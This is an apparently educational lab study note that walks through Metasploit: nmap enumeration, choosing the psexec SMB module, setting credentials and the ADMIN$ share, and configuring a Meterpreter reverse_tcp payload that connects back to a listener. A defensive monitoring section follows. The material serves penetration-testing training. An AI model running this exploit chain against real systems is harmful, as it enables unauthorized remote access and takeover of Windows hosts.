# 🧰 Automating Payloads & Delivery with Metasploit

> [!abstract] 🎯 Core Idea  
> **Metasploit** is an automated penetration-testing framework that provides pre-built modules for tasks such as exploitation, enumeration, payload delivery, and establishing sessions.
> 
> Instead of manually constructing every part of an attack, Metasploit provides a framework where we can:
> 
> ```text
> 🔎 Identify Target
>        │
>        ▼
> 🧩 Find Appropriate Module
>        │
>        ▼
> ⚙️ Configure Options
>        │
>        ▼
> 📦 Select Payload
>        │
>        ▼
> 🚀 Execute
>        │
>        ▼
> 🖥️ Establish Session
> ```
> 
> 🧠 **The important lesson:** Metasploit makes exploitation easier, but understanding what the framework is actually doing is essential—especially in a real penetration test.

---

# 1️⃣ What Is Metasploit?

**Metasploit** is an exploitation and penetration-testing framework developed by **Rapid7**.

It contains many pre-built modules that can help with:

- 🔎 Enumeration
    
- 🧪 Vulnerability checking
    
- 💥 Exploitation
    
- 📦 Payload delivery
    
- 🖥️ Session management
    
- 🔧 Post-exploitation
    

```text
                    🧰 METASPLOIT
                         │
        ┌────────────────┼────────────────┐
        ▼                ▼                ▼
     🔎 Scan          💥 Exploit       📦 Payload
        │                │                │
        └────────────────┼────────────────┘
                         ▼
                    🖥️ Session
```

> [!warning] ⚠️ Important  
> Metasploit can automate complicated operations, but blindly running modules without understanding their effects can be dangerous on a real engagement.
> 
> Always understand:
> 
> **What is being executed? → Against what? → With which credentials? → Which payload? → What happens after exploitation?**

---

# 2️⃣ Metasploit Editions

The material distinguishes between:

```text
🧰 Metasploit
    │
    ├── Community Edition
    │
    └── Metasploit Pro
```

### 🆓 Community Edition

Useful for learning and hands-on penetration-testing labs.

### 💼 Metasploit Pro

A commercial version used by organizations for activities such as:

- Penetration testing
    
- Security assessments
    
- Auditing
    
- Social-engineering campaigns
    

### 🧠 Remember

```text
Metasploit
   │
   ├── Framework → Core functionality
   │
   └── Pro → Commercial edition with additional capabilities
```

---

# 3️⃣ Starting Metasploit

The primary interactive console is:

```bash
sudo msfconsole
```

After starting, the prompt looks similar to:

```text
msf6 >
```

This console is the main interface for interacting with Metasploit modules.

```text
🖥️ Terminal
     │
     ▼
sudo msfconsole
     │
     ▼
🧰 Metasploit Console
     │
     ▼
msf6 >
```

---

# 4️⃣ Metasploit Module Types

Metasploit contains different types of modules.

Common categories include:

|🧩 Module|🎯 Purpose|
|---|---|
|`exploit`|Attempts to exploit a vulnerability|
|`auxiliary`|Scanning, enumeration, fuzzing, and other supporting tasks|
|`payload`|Code executed after exploitation|
|`post`|Post-exploitation functionality|
|`encoder`|Encodes payloads|
|`nop`|NOP-related payload support|
|`evasion`|Techniques intended to evade certain security controls|

The exact number of modules changes as Metasploit is updated.

```text
🧰 Metasploit
    │
    ├── 💥 Exploits
    ├── 🔎 Auxiliary
    ├── 📦 Payloads
    ├── 🔧 Post
    ├── 🔄 Encoders
    ├── 🧱 NOPs
    └── 🥷 Evasion
```

---

# 🔎 5️⃣ Start With Enumeration

Before selecting an exploit, we need information about the target.

A common workflow is:

```text
🎯 Target
   │
   ▼
🔎 Nmap
   │
   ▼
📊 Enumeration Results
   │
   ▼
🧠 Identify OS / Services
   │
   ▼
🧩 Search Metasploit
```

Example:

```bash
nmap -sC -sV -Pn 10.129.164.25
```

### 🔎 Important Options

|Option|Meaning|
|---|---|
|`-sC`|Run default Nmap scripts|
|`-sV`|Detect service versions|
|`-Pn`|Skip host discovery and treat target as online|

---

# 🖥️ 6️⃣ Understanding the Nmap Results

Example results:

```text
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

These ports suggest Windows-related services.

The particularly interesting service here is:

```text
445/tcp
   │
   ▼
SMB
```

### 🧠 Attack-Surface Thinking

Don't immediately think:

```text
445 → Exploit it
```

Instead think:

```text
445
 │
 ▼
SMB Service
 │
 ▼
What version?
 │
 ▼
What vulnerabilities?
 │
 ▼
What modules exist?
```

---

# 🔎 7️⃣ Searching Metasploit

Inside `msfconsole`:

```text
search smb
```

Metasploit returns modules associated with SMB.

Example:

```text
Matching Modules
================

#    Name
41   auxiliary/scanner/smb/smb_ms17_010
56   exploit/windows/smb/psexec
58   exploit/windows/smb/smb_rras_erraticgopher
...
```

### 🧠 Important

The number on the left:

```text
56
```

is only a **relative search-result index**.

It can change when the module database changes.

```text
❌ Don't memorize:
56 = psexec forever

✅ Understand:
56 = current search-result index
```

---

# 🧩 8️⃣ Understanding Module Paths

One interesting module is:

```text
exploit/windows/smb/psexec
```

Break it apart:

```text
exploit
   │
   ▼
Module type

windows
   │
   ▼
Target platform

smb
   │
   ▼
Attack/service category

psexec
   │
   ▼
Specific module
```

### 📊 Module Path

|Component|Meaning|
|---|---|
|`exploit/`|Exploitation module|
|`windows/`|Windows target|
|`smb/`|SMB-related attack vector|
|`psexec`|Specific exploitation mechanism|

### 🧠 Memorize the Structure

```text
TYPE / PLATFORM / SERVICE / MODULE
```

---

# 🎯 9️⃣ Selecting a Module

A module can be selected using:

```text
use 56
```

or by its full path:

```text
use exploit/windows/smb/psexec
```

The prompt then changes:

```text
msf6 exploit(windows/smb/psexec) >
```

This tells us which module is currently active.

```text
msf6 >
   │
   ▼
use exploit/windows/smb/psexec
   │
   ▼
msf6 exploit(windows/smb/psexec) >
```

---

# 📦 🔟 Default Payload

When the module is selected, Metasploit may automatically choose a default payload.

Example:

```text
[*] No payload configured, defaulting to
windows/meterpreter/reverse_tcp
```

Break this down:

```text
windows
   │
   ▼
Target platform

meterpreter
   │
   ▼
Payload type

reverse_tcp
   │
   ▼
Communication method
```

So:

```text
windows/meterpreter/reverse_tcp
```

means:

> A Windows Meterpreter payload using a reverse TCP connection.

---

# 🧠 1️⃣1️⃣ Exploit vs Payload

This distinction is extremely important.

```text
💥 EXPLOIT
   │
   └── Takes advantage of a vulnerability
                │
                ▼
📦 PAYLOAD
   │
   └── Performs the desired action
                │
                ▼
🖥️ SESSION
```

### Example

```text
exploit/windows/smb/psexec
            │
            ▼
      Exploitation
            │
            ▼
windows/meterpreter/reverse_tcp
            │
            ▼
     Meterpreter Session
```

> [!important] 🎯 Remember  
> **Exploit = method of gaining execution**
> 
> **Payload = code executed on the target**
> 
> **Session = communication interface you receive afterward**

---

# ⚙️ 1️⃣2️⃣ The `options` Command

After selecting a module:

```text
options
```

displays the settings available for the current module.

Example categories:

```text
Module options
Payload options
Exploit target
```

```text
msf6 exploit(windows/smb/psexec) >
                         │
                         ▼
                      options
                         │
             ┌───────────┴───────────┐
             ▼                       ▼
       💥 Exploit Options       📦 Payload Options
```

---

# 🎯 1️⃣3️⃣ RHOSTS

```text
RHOSTS
```

means:

> **Remote Hosts**

It identifies the target system or systems.

Example:

```text
set RHOSTS 10.129.180.71
```

Conceptually:

```text
RHOSTS
  │
  ▼
🎯 Where is the target?
```

---

# 🌐 1️⃣4️⃣ RPORT

```text
RPORT 445
```

means:

> **Remote Port**

For this module, port `445` is the SMB service.

```text
RHOSTS
   │
   ▼
Target IP

RPORT
   │
   ▼
Target service port
```

Together:

```text
RHOSTS → 10.129.180.71
RPORT  → 445

             │
             ▼
🎯 10.129.180.71:445
```

---

# 👤 1️⃣5️⃣ SMB Credentials

The module can use authentication settings such as:

```text
SMBUser
SMBPass
SMBDomain
```

Example:

```text
set SMBUser htb-student
set SMBPass <password>
```

Conceptually:

```text
🎯 SMB Service
      │
      ▼
🔐 Authentication
      │
      ├── Username
      ├── Password
      └── Domain
```

> [!important] 🧠 Key Point  
> The example module requires appropriate authentication information for the attack path being demonstrated.

---

# 📂 1️⃣6️⃣ SMB Share

The example configures:

```text
set SHARE ADMIN$
```

`ADMIN$` is a Windows administrative share.

Conceptually:

```text
🪟 Windows
    │
    ▼
📂 ADMIN$
    │
    ▼
Administrative file access
```

The module can use the share as part of its payload-delivery process.

---

# 🎧 1️⃣7️⃣ LHOST

```text
LHOST
```

means:

> **Local Host**

This identifies the address where the reverse payload should connect back.

Example:

```text
set LHOST 10.10.14.222
```

Think:

```text
LHOST
  │
  ▼
🖥️ Your / listener-side machine
```

---

# 🔌 1️⃣8️⃣ LPORT

The payload also has a local listening port.

Example:

```text
LPORT 4444
```

Together:

```text
LHOST → 10.10.14.222
LPORT → 4444
```

means:

```text
👂 Listener
   │
   ▼
10.10.14.222:4444
```

---

# 🔄 1️⃣9️⃣ Reverse TCP Flow

The reverse payload works conceptually like this:

```text
             💥 Exploit
                 │
                 ▼
          🖥️ Windows Target
                 │
                 │ Reverse TCP
                 ▼
          🖥️ Attack Machine
                 │
                 ▼
        10.10.14.222:4444
                 │
                 ▼
         📦 Meterpreter
                 │
                 ▼
             💻 Session
```

### 🧠 Remember

```text
RHOSTS → Where am I attacking?
RPORT  → Which service?
LHOST  → Where should the payload connect back?
LPORT  → Which local port?
```

---

# ⚙️ 2️⃣0️⃣ Setting Options

Metasploit uses:

```text
set OPTION VALUE
```

Examples from the lab:

```text
set RHOSTS <target>
set SHARE ADMIN$
set SMBUser <username>
set SMBPass <password>
set LHOST <your-ip>
```

After setting options, the configuration becomes:

```text
🎯 Target
   │
   ├── RHOSTS
   └── RPORT
         │
         ▼
      SMB Service

🔐 Credentials
   │
   ├── SMBUser
   └── SMBPass

📦 Payload
   │
   ├── LHOST
   └── LPORT
```

---

# 🚀 2️⃣1️⃣ Running the Exploit

Once the configuration is complete:

```text
exploit
```

starts the module.

Conceptually:

```text
exploit
   │
   ▼
💥 Run Module
   │
   ▼
🔐 Authenticate
   │
   ▼
📂 Access SMB
   │
   ▼
📦 Deliver Payload
   │
   ▼
🌐 Reverse Connection
   │
   ▼
🖥️ Meterpreter Session
```

---

# 📊 2️⃣2️⃣ Reading Metasploit Output

Metasploit provides status messages during execution.

Example flow:

```text
[*] Started reverse TCP handler
        │
        ▼
[*] Connecting to server
        │
        ▼
[*] Authenticating
        │
        ▼
[*] Executing payload
        │
        ▼
[*] Sending stage
        │
        ▼
[*] Meterpreter session opened
        │
        ▼
meterpreter >
```

### 🧠 Why This Output Matters

Metasploit tells you what stage of the operation has been reached.

```text
🔎 Connect
   ↓
🔐 Authenticate
   ↓
⚙️ Execute
   ↓
📦 Send Stage
   ↓
🖥️ Establish Session
```

---

# 📦 2️⃣3️⃣ Meterpreter

**Meterpreter** is a Metasploit payload/session environment that provides a richer interface than a basic raw TCP shell.

```text
Raw Shell
   │
   └── Basic command execution

Meterpreter
   │
   ├── Session management
   ├── File operations
   ├── Process interaction
   ├── Command execution
   └── Additional post-exploitation functionality
```

> [!warning] 🛡️ Defensive Perspective  
> Meterpreter is not simply "a better command prompt." It establishes a communication channel that provides a collection of post-exploitation capabilities, which makes it important for defenders to monitor.

---

# 🧠 2️⃣4️⃣ Meterpreter Staging

The example output contains:

```text
Sending stage (...)
```

and then:

```text
Meterpreter session 1 opened
```

Conceptually:

```text
Initial Connection
       │
       ▼
📡 Communication Established
       │
       ▼
📦 Stage Sent
       │
       ▼
🧩 Meterpreter Components Loaded
       │
       ▼
🖥️ Meterpreter Session
```

### 🧠 Remember

```text
Initial connection
        +
Payload stage
        =
Meterpreter session
```

---

# 🖥️ 2️⃣5️⃣ Meterpreter Prompt

After successful exploitation:

```text
meterpreter >
```

appears.

This is now an interactive Meterpreter session.

```text
msf6 >
   │
   ▼
exploit
   │
   ▼
meterpreter >
```

These are **different interfaces**:

```text
msf6 >
   │
   └── Metasploit Framework console

meterpreter >
   │
   └── Meterpreter session
```

---

# ❓ 2️⃣6️⃣ Meterpreter Help

Inside Meterpreter:

```text
?
```

can be used to display available commands.

```text
meterpreter >
       │
       ▼
      ?
       │
       ▼
📋 Available Meterpreter commands
```

This is useful because Meterpreter has its own command set.

---

# 🐚 2️⃣7️⃣ Dropping Into a System Shell

Meterpreter is powerful, but it does not necessarily provide every native operating-system command directly.

The:

```text
shell
```

command can open a system shell.

Example:

```text
meterpreter > shell
```

Result:

```text
C:\WINDOWS\system32>
```

Conceptually:

```text
meterpreter
     │
     ▼
  shell
     │
     ▼
🪟 Windows Command Shell
     │
     ▼
C:\WINDOWS\system32>
```

---

# 🔄 2️⃣8️⃣ Meterpreter vs System Shell

```text
                 🖥️ Target
                     │
                     ▼
               📦 Meterpreter
                     │
          ┌──────────┴──────────┐
          ▼                     ▼
     meterpreter >          shell
                                │
                                ▼
                         C:\WINDOWS\system32>
```

### 🧠 Difference

|Interface|Purpose|
|---|---|
|`msf6 >`|Control Metasploit|
|`meterpreter >`|Interact through Meterpreter|
|`C:\...>`|Native Windows command shell|

---

# 🧩 2️⃣9️⃣ Complete Metasploit Workflow

The entire process can be remembered as:

```text
                     🎯 TARGET
                        │
                        ▼
                    🔎 NMAP
                        │
                        ▼
                📊 ENUMERATION
                        │
                        ▼
             🧠 IDENTIFY SERVICE
                        │
                        ▼
               🧩 SEARCH MSF
                        │
                        ▼
                💥 SELECT EXPLOIT
                        │
                        ▼
                  ⚙️ OPTIONS
                        │
             ┌──────────┴──────────┐
             ▼                     ▼
         🎯 Target              📦 Payload
             │                     │
          RHOSTS                 LHOST
          RPORT                  LPORT
             │                     │
             └──────────┬──────────┘
                        ▼
                     🚀 EXPLOIT
                        │
                        ▼
                  📦 PAYLOAD
                        │
                        ▼
                🌐 CONNECTION
                        │
                        ▼
                 🖥️ METERPRETER
                        │
                        ▼
                    🐚 SHELL
```

---

# 🧠 3️⃣0️⃣ The Most Important Metasploit Concepts

### ① Module

A component that performs a particular function.

```text
exploit/windows/smb/psexec
```

---

### ② Exploit

Attempts to take advantage of a vulnerability or attack mechanism.

```text
💥 Exploit
   ↓
Gain execution
```

---

### ③ Payload

The code executed after exploitation.

```text
📦 Payload
   ↓
Perform action
```

---

### ④ RHOSTS

Target host.

```text
RHOSTS → 🎯 Target
```

---

### ⑤ RPORT

Target service port.

```text
RPORT → 🌐 Target service
```

---

### ⑥ LHOST

Local/listener-side host.

```text
LHOST → 🖥️ Your machine
```

---

### ⑦ LPORT

Local/listener-side port.

```text
LPORT → 👂 Listening port
```

---

### ⑧ Session

The interactive communication channel established after successful exploitation.

```text
Exploit
   │
   ▼
Payload
   │
   ▼
Session
```

---

# 📊 3️⃣1️⃣ Metasploit Command Cheat Sheet

|🧰 Command|🎯 Purpose|
|---|---|
|`msfconsole`|Start Metasploit|
|`search <term>`|Search for modules|
|`use <module>`|Select a module|
|`options`|Display module settings|
|`set <option> <value>`|Set an option|
|`exploit`|Run the selected exploit|
|`?`|Display available Meterpreter commands|
|`shell`|Open a native system shell|

### 🧠 Basic Workflow

```text
search
  ↓
use
  ↓
options
  ↓
set
  ↓
exploit
  ↓
session
```

---

# 🛡️ 3️⃣2️⃣ Defensive Perspective

Metasploit demonstrates why defenders need visibility across multiple layers.

A successful exploitation chain can involve:

```text
🔎 Reconnaissance
      │
      ▼
🌐 Network Service
      │
      ▼
💥 Exploit
      │
      ▼
📦 Payload
      │
      ▼
⚙️ Process Execution
      │
      ▼
🌐 Network Connection
      │
      ▼
🖥️ Interactive Session
```

A defender can potentially monitor:

- 🌐 Network connections
    
- 🔐 Authentication events
    
- 🧰 Process creation
    
- 💻 Command lines
    
- 📂 File creation
    
- 🪟 Windows services
    
- 🧩 Memory activity
    
- 🔄 Parent/child process relationships
    

> [!important] 🛡️ Big Defensive Lesson  
> The more stages of the attack chain that are visible, the more opportunities defenders have to detect and investigate the activity.

---

# 🎯 3️⃣3️⃣ Why Understanding Metasploit Matters

Metasploit automates many operations, but the operator still needs to understand:

```text
🎯 What is the target?
        │
        ▼
🔎 What service is exposed?
        │
        ▼
🧩 Which module matches?
        │
        ▼
📦 Which payload is appropriate?
        │
        ▼
⚙️ Which options must be configured?
        │
        ▼
🌐 Where does the payload connect?
        │
        ▼
🖥️ What type of session is created?
```

> [!warning] ⚠️ Don't Become a "Button Pusher"  
> Knowing that `exploit` produces a shell is not enough.
> 
> A penetration tester should understand **why the module works, what it changes, what traffic it generates, what payload is being delivered, and what happens on the target.**

---

# ⚡ 3️⃣4️⃣ Final Takeaways

> [!success] 🎯 What You Should Remember

**1. Metasploit** 🧰  
An automated penetration-testing framework containing many pre-built modules.

**2. Enumeration comes first** 🔎  
Use information such as Nmap results to identify the target OS, services, and potential attack vectors.

**3. Modules have structure** 🧩

```text
TYPE / PLATFORM / SERVICE / MODULE
```

Example:

```text
exploit/windows/smb/psexec
```

**4. Exploit ≠ Payload** 💥📦  
The exploit provides the mechanism for gaining execution; the payload performs the desired action.

**5. RHOSTS / RPORT** 🎯

```text
RHOSTS → Target IP
RPORT  → Target service port
```

**6. LHOST / LPORT** 🎧

```text
LHOST → Listener-side IP
LPORT → Listener-side port
```

**7. Meterpreter** 🖥️  
A feature-rich Metasploit payload/session environment.

**8. `shell`** 🐚  
Can transition from Meterpreter into the native operating-system shell.

**9. Understand the automation** 🧠  
Metasploit makes complex operations easier, but the operator is still responsible for understanding what is happening.

---

# 🧠 3️⃣5️⃣ Ultimate Memory Map

```text
                         🧰 METASPLOIT
                              │
                              ▼
                       🔎 ENUMERATION
                              │
                              ▼
                       🧩 SEARCH MODULE
                              │
                              ▼
                         💥 EXPLOIT
                              │
                              ▼
                         📦 PAYLOAD
                              │
                  ┌───────────┴───────────┐
                  ▼                       ▼
             🎯 TARGET                 👂 LISTENER
                  │                       │
             RHOSTS/RPORT             LHOST/LPORT
                  │                       │
                  └───────────┬───────────┘
                              ▼
                         🌐 CONNECTION
                              │
                              ▼
                       🖥️ METERPRETER
                              │
                              ▼
                            🐚 SHELL
                              │
                              ▼
                       🎯 INTERACTION
```

> [!quote] 💡 Big Picture  
> **Metasploit is an automation framework, not a substitute for understanding.**
> 
> The core workflow is:
> 
> **Enumerate → Identify → Search → Select Module → Configure → Choose Payload → Execute → Establish Session**
> 
> Once you understand that workflow, the individual Metasploit commands become much easier to remember and use correctly in an authorized lab or penetration test.